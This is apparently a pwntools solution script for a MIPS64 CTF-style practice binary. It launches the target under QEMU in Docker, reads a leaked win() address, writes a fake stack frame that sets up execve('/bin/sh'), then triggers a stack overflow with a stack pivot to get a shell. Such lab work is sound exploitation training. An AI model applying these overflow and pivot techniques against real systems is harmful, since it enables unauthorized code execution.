from pwn import *


# initialize the binary
build = 'mipsel64r2-glibc-n64'
binary = "mips64r2le_static_n64"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa64r2
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
SYS_EXECVE = 5057

# get win() leak
win_addr = int(p.readline().strip(),16)
print(f'win(): {hex(win_addr)}')

# fill "new stack" with data needed to exec "/bin/sh"
new_stack = flat(
    p64(0),                                 # gp
    p64(0),                                 # sp
    p64(elf.sym['win']+12),                 # skip win() function prologue
    p64(next(elf.search(b'/bin/sh\x00'))),  # a0
    p64(0),                                 # a1
    p64(0),                                 # a2
    p64(SYS_EXECVE),                        # v0 (sys_execve)
).ljust(0x40, b'a')
p.send(new_stack)

print(hex(elf.sym['vuln']))
# exploit stack overflow
payload = flat(
    # padding
    b'a'*0x30,
    p64(elf.sym['global_buf']-0x28),

    # stack pivot gadget
    p64(elf.sym['vuln']+60),                     # move sp,s8
)
p.sendline(payload)
p.interactive()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)